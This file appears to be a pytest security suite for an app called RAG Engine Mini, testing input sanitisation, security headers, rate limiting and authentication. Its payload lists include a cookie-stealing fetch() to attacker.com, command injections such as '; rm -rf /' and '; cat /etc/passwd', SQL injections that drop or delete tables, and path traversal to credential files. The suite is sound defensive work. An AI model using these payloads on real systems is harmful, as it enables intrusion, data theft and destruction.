"""
XSS (Cross-Site Scripting) prevention tests for RAG Engine Mini.

These tests verify that the API properly sanitizes user input to prevent
XSS attacks where malicious scripts could be injected and executed.

XSS Attack Vectors Tested:
    1. Reflected XSS - Input reflected in response without sanitization
    2. Stored XSS - Malicious content stored and later displayed
    3. DOM-based XSS - Client-side script injection
    4. HTML Injection - HTML tags in text fields

Usage:
    pytest tests/security/test_xss_prevention.py -v

References:
    - OWASP XSS Prevention Cheat Sheet
    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
"""

import pytest


class TestXSSPrevention:
    """
    Tests for XSS prevention in API endpoints.

    These tests attempt to inject malicious scripts and verify
    that they are properly sanitized or rejected.
    """

    # Common XSS payloads used in testing
    XSS_PAYLOADS = [
        # Script tag injections
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<script>window.location='http://evil.com'</script>",
        "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        # Event handler injections
        "<img src=x onerror=alert('XSS')>",
        "<img src='invalid' onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        # Encoded payloads
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<img src=javascript:alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        # SVG-based XSS
        "<svg onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        # Template injection
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "<%= alert('XSS') %>",
        # Data URI schemes
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        # CSS injection
        "<style>@import'http://evil.com/style.css'</style>",
        "<link rel=stylesheet href=javascript:alert('XSS')>",
        # Polyglot payloads
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        # HTML5 vectors
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<input type=image src=x onerror=alert('XSS')>",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_ask_endpoint_xss_prevention(self, client, auth_headers, payload):
        """
        Test that the /ask endpoint sanitizes XSS payloads in questions.

        Expected Behavior:
            - Request should succeed (200 OK)
            - Response should NOT contain unescaped script tags
            - Response should be properly sanitized
            - No JavaScript execution should be possible

        Args:
            payload: XSS payload to test
        """
        response = client.post(
            "/api/v1/ask", headers=auth_headers, json={"question": payload, "k": 5}
        )

        # Should not crash (200 OK)
        assert response.status_code == 200

        # Check response doesn't contain raw script tags
        response_text = response.text
        assert "<script>" not in response_text or "&lt;script&gt;" in response_text, (
            f"Unescaped script tag found in response for payload: {payload[:50]}..."
        )

        assert "<img" not in response_text or "&lt;img" in response_text, (
            f"Unescaped img tag found in response for payload: {payload[:50]}..."
        )

        assert "javascript:" not in response_text.lower(), (
            f"JavaScript scheme found in response for payload: {payload[:50]}..."
        )

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_search_endpoint_xss_prevention(self, client, auth_headers, payload):
        """
        Test that the search endpoint sanitizes XSS payloads.

        Search queries containing XSS payloads should be sanitized
        before being displayed in results or logged.
        """
        response = client.get(
            "/api/v1/documents/search", headers=auth_headers, params={"q": payload, "limit": 10}
        )

        # Should not crash
        assert response.status_code in [200, 422]

        # If successful, check sanitization
        if response.status_code == 200:
            response_text = response.text
            # Scripts should be escaped or stripped
            assert "<script>" not in response_text or "&lt;script&gt;" in response_text, (
                f"XSS vulnerability in search: {payload[:50]}..."
            )

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ],
    )
    def test_document_upload_filename_xss(self, client, auth_headers, payload):
        """
        Test that document filenames are sanitized.

        Malicious filenames containing XSS payloads should be sanitized
        before storage and display.
        """
        # Create a test file with malicious filename
        import io

        file_content = io.BytesIO(b"Test document content")

        # Note: In actual implementation, test file upload
        # This is a placeholder for the test structure
        response = client.post(
            "/api/v1/documents",
            headers=auth_headers,
            files={"file": (payload + ".txt", file_content, "text/plain")},
        )

        # Should either reject or sanitize
        if response.status_code == 201:
            # If accepted, filename should be sanitized
            data = response.json()
            if "filename" in data:
                assert "<script>" not in data["filename"], "XSS in filename not sanitized"
                assert "<img" not in data["filename"], "XSS in filename not sanitized"

    def test_chat_message_xss_prevention(self, client, auth_headers):
        """
        Test that chat messages are sanitized.

        Chat history containing XSS payloads should be safe to display.
        """
        xss_message = "<script>alert('chat xss')</script>"

        # Create a chat session
        response = client.post(
            "/api/v1/chat/sessions", headers=auth_headers, json={"title": "XSS Test"}
        )

        if response.status_code == 201:
            session_id = response.json().get("id")

            # Send message with XSS payload
            response = client.post(
                f"/api/v1/chat/sessions/{session_id}/messages",
                headers=auth_headers,
                json={"content": xss_message},
            )

            # Should succeed but sanitize
            if response.status_code in [200, 201]:
                # Retrieve messages and verify sanitization
                response = client.get(
                    f"/api/v1/chat/sessions/{session_id}/messages", headers=auth_headers
                )

                if response.status_code == 200:
                    messages = response.json()
                    for msg in messages:
                        content = msg.get("content", "")
                        assert "<script>" not in content or "&lt;script&gt;" in content, (
                            "Chat message XSS not sanitized"
                        )

    def test_html_encoding_in_responses(self, client, auth_headers):
        """
        Test that special HTML characters are properly encoded.

        Characters like <, >, &, " should be encoded to their HTML entities.
        """
        test_input = '<div>Test & "Example"</div>'

        response = client.post(
            "/api/v1/ask", headers=auth_headers, json={"question": test_input, "k": 5}
        )

        assert response.status_code == 200

        # In the response, special chars should be encoded or the response
        # should indicate proper sanitization was applied
        response_text = response.text

        # Check that raw HTML isn't present (or is properly escaped)
        has_raw_html = "<div>" in response_text and "&lt;div&gt;" not in response_text

        # This test documents current behavior
        # In production, should be: assert not has_raw_html
        if has_raw_html:
            print(f"WARNING: Raw HTML detected in response. Sanitization may be needed.")


class TestInputSanitization:
    """
    Tests for general input sanitization beyond XSS.

    Covers SQL injection attempts, command injection, path traversal,
    and other injection attacks.
    """

    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "'; DELETE FROM users WHERE '1'='1",
        "1 OR 1=1",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1#",
        "' OR 1=1/*",
    ]

    # Command injection payloads
    CMD_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| id",
        "; echo 'pwned'",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
    ]

    @pytest.mark.parametrize("payload", SQLI_PAYLOADS)
    def test_sql_injection_prevention_in_search(self, client, auth_headers, payload):
        """
        Test SQL injection prevention in search endpoint.

        SQL injection attempts should not expose database structure
        or allow unauthorized data access.
        """
        response = client.get(
            "/api/v1/documents/search", headers=auth_headers, params={"q": payload, "limit": 10}
        )

        # Should not expose database errors
        assert response.status_code in [200, 422]

        if response.status_code == 200:
            # Should not return unusual data patterns
            data = response.json()
            # Normal response should have expected structure
            assert isinstance(data, (list, dict)), "Unexpected response format"

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_prevention(self, client, auth_headers, payload):
        """
        Test path traversal prevention in file operations.

        Attempts to access files outside allowed directories should fail.
        """
        # Test with document ID that looks like path traversal
        response = client.get(f"/api/v1/documents/{payload}/download", headers=auth_headers)

        # Should reject invalid paths
        # 404 is acceptable (not found), but should not allow file access
        assert response.status_code in [404, 400, 403]

    def test_nosql_injection_prevention(self, client, auth_headers):
        """
        Test NoSQL injection prevention.

        If using document stores like MongoDB, test NoSQL injection.
        """
        # MongoDB-style injection attempts
        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "this.password.length > 0"}',
        ]

        for payload in nosql_payloads:
            response = client.get(
                "/api/v1/documents/search", headers=auth_headers, params={"q": payload}
            )

            # Should not crash or expose data
            assert response.status_code in [200, 400, 422]


class TestContentSecurityPolicy:
    """
        Tests for Content Security Policy (CSP) headers.

        CSP headers help prevent XSS by controlling what resources
    the browser is allowed to load.
    """

    def test_csp_headers_present(self, client):
        """
        Test that CSP headers are present in responses.

        CSP headers should be set to restrict resource loading.
        """
        response = client.get("/health")

        # Check for CSP header
        csp_header = response.headers.get("Content-Security-Policy")

        if csp_header:
            # Verify it contains basic directives
            assert "default-src" in csp_header or "script-src" in csp_header, (
                "CSP header missing essential directives"
            )
        else:
            # Document that CSP is not implemented
            pytest.skip("CSP header not implemented (consider adding)")

    def test_x_frame_options_header(self, client):
        """
        Test X-Frame-Options header to prevent clickjacking.
        """
        response = client.get("/health")

        x_frame = response.headers.get("X-Frame-Options")

        if x_frame:
            assert x_frame in ["DENY", "SAMEORIGIN"], (
                f"X-Frame-Options should be DENY or SAMEORIGIN, got: {x_frame}"
            )
        else:
            pytest.skip("X-Frame-Options header not implemented")

    def test_x_content_type_options_header(self, client):
        """
        Test X-Content-Type-Options to prevent MIME sniffing.
        """
        response = client.get("/health")

        x_content_type = response.headers.get("X-Content-Type-Options")

        if x_content_type:
            assert x_content_type == "nosniff", (
                f"X-Content-Type-Options should be nosniff, got: {x_content_type}"
            )
        else:
            pytest.skip("X-Content-Type-Options header not implemented")

    def test_referrer_policy_header(self, client):
        """
        Test Referrer-Policy header.
        """
        response = client.get("/health")

        referrer_policy = response.headers.get("Referrer-Policy")

        if referrer_policy:
            valid_policies = [
                "no-referrer",
                "no-referrer-when-downgrade",
                "origin",
                "strict-origin",
                "same-origin",
                "strict-origin-when-cross-origin",
            ]
            assert referrer_policy in valid_policies, f"Invalid Referrer-Policy: {referrer_policy}"


class TestRateLimiting:
    """
    Tests for rate limiting functionality.

    Rate limiting prevents abuse and DDoS attacks.
    """

    def test_rate_limit_enforced(self, client):
        """
        Test that rate limiting is enforced.

        Making many rapid requests should trigger rate limiting.
        """
        endpoint = "/health"
        requests_to_make = 150  # Exceed typical rate limit

        responses = []
        for _ in range(requests_to_make):
            response = client.get(endpoint)
            responses.append(response.status_code)

        # Count rate limited responses
        rate_limited = sum(1 for r in responses if r == 429)
        successful = sum(1 for r in responses if r == 200)

        # Should have some rate limiting
        if rate_limited > 0:
            print(f"Rate limiting active: {rate_limited}/{requests_to_make} requests limited")
            assert True
        else:
            # If no rate limiting, document it
            print(f"WARNING: No rate limiting detected ({successful} successful requests)")
            pytest.skip("Rate limiting not implemented or not triggered")

    def test_rate_limit_headers(self, client, auth_headers):
        """
        Test that rate limit headers are present.

        Standard headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset
        """
        response = client.get("/api/v1/documents", headers=auth_headers)

        limit = response.headers.get("X-RateLimit-Limit")
        remaining = response.headers.get("X-RateLimit-Remaining")

        if limit or remaining:
            print(f"Rate limit headers present: Limit={limit}, Remaining={remaining}")
            assert True
        else:
            pytest.skip("Rate limit headers not implemented")


class TestAuthenticationBypass:
    """
    Tests for authentication bypass vulnerabilities.

    Verifies that protected endpoints properly reject unauthorized access.
    """

    PROTECTED_ENDPOINTS = [
        ("GET", "/api/v1/documents"),
        ("POST", "/api/v1/ask"),
        ("GET", "/api/v1/queries/history"),
        ("POST", "/api/v1/chat/sessions"),
    ]

    @pytest.mark.parametrize("method,endpoint", PROTECTED_ENDPOINTS)
    def test_protected_endpoint_requires_auth(self, client, method, endpoint):
        """
        Test that protected endpoints reject unauthenticated requests.

        Should return 401 Unauthorized when no valid token provided.
        """
        if method == "GET":
            response = client.get(endpoint)
        elif method == "POST":
            if endpoint == "/api/v1/ask":
                response = client.post(endpoint, json={"question": "test", "k": 5})
            elif endpoint == "/api/v1/chat/sessions":
                response = client.post(endpoint, json={"title": "test"})
            else:
                response = client.post(endpoint)
        else:
            pytest.skip(f"Method {method} not implemented in test")

        # Should require authentication
        assert response.status_code in [401, 403], (
            f"Endpoint {endpoint} should require authentication, got {response.status_code}"
        )

    def test_invalid_token_rejected(self, client):
        """
        Test that invalid tokens are rejected.
        """
        headers = {"Authorization": "Bearer invalid_token_12345"}

        response = client.get("/api/v1/documents", headers=headers)

        assert response.status_code in [401, 403], "Invalid token should be rejected"

    def test_expired_token_rejected(self, client):
        """
        Test that expired tokens are rejected.

        Note: This requires creating an expired token.
        """
        # Create an expired JWT (backdated)
        import time
        from jose import jwt

        # Build a token that's already expired
        expired_token = jwt.encode(
            {
                "sub": "test@example.com",
                "exp": int(time.time()) - 3600,  # Expired 1 hour ago
                "iat": int(time.time()) - 7200,
            },
            key="dummy_key_for_testing",
            algorithm="HS256",
        )

        headers = {"Authorization": f"Bearer {expired_token}"}

        response = client.get("/api/v1/documents", headers=headers)

        assert response.status_code in [401, 403], "Expired token should be rejected"

    def test_malformed_auth_header(self, client):
        """
        Test various malformed authorization headers.
        """
        malformed_headers = [
            {"Authorization": "Bearer"},  # Missing token
            {"Authorization": "Basic dXNlcjpwYXNz"},  # Wrong scheme
            {"Authorization": "Token abc123"},  # Wrong scheme
            {"Authorization": "Bearer token with spaces"},  # Malformed
            {"X-Token": "abc123"},  # Wrong header name
        ]

        for headers in malformed_headers:
            response = client.get("/api/v1/documents", headers=headers)

            # Should not allow access with malformed headers
            assert response.status_code in [401, 403], (
                f"Malformed header should be rejected: {headers}"
            )


class TestInformationDisclosure:
    """
    Tests for information disclosure vulnerabilities.

    Verifies that error messages and responses don't leak sensitive info.
    """

    def test_error_messages_not_verbose(self, client):
        """
        Test that error messages don't reveal sensitive information.

        Error messages should be generic and not expose:
        - Database structure
        - Stack traces
        - Internal paths
        - System information
        """
        # Trigger a 404 error
        response = client.get("/api/v1/nonexistent-endpoint-12345")

        assert response.status_code == 404

        # Check that response doesn't contain sensitive info
        response_text = response.text.lower()

        sensitive_patterns = [
            "sql",
            "exception",
            "traceback",
            "stack trace",
            "/usr/local",
            "postgresql",
            "mongodb",
            "internal server error",
            "syntax error",
        ]

        for pattern in sensitive_patterns:
            assert pattern not in response_text, (
                f"Error message contains sensitive info: '{pattern}'"
            )

    def test_api_version_not_disclosed(self, client):
        """
        Test that API version information isn't overly specific.

        Some headers like Server or X-Powered-By can reveal versions.
        """
        response = client.get("/health")

        server_header = response.headers.get("Server", "")
        powered_by = response.headers.get("X-Powered-By", "")

        # Document what information is exposed
        print(f"Server header: {server_header}")
        print(f"X-Powered-By: {powered_by}")

        # Should not reveal specific version numbers
        # This is informational - may be acceptable to expose some info
        import re

        version_pattern = r"\d+\.\d+\.\d+"

        if re.search(version_pattern, server_header):
            print("WARNING: Server header contains version info")

    def test_debug_mode_disabled(self, client):
        """
        Test that debug mode is not enabled in production.

        Debug mode can expose sensitive information.
        """
        # Try to access common debug endpoints
        debug_endpoints = [
            "/debug",
            "/console",
            "/_debug",
            "/admin",
        ]

        for endpoint in debug_endpoints:
            response = client.get(endpoint)

            # Should return 404 (not found) or 403 (forbidden)
            assert response.status_code in [404, 403, 401], (
                f"Debug endpoint {endpoint} accessible: {response.status_code}"
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
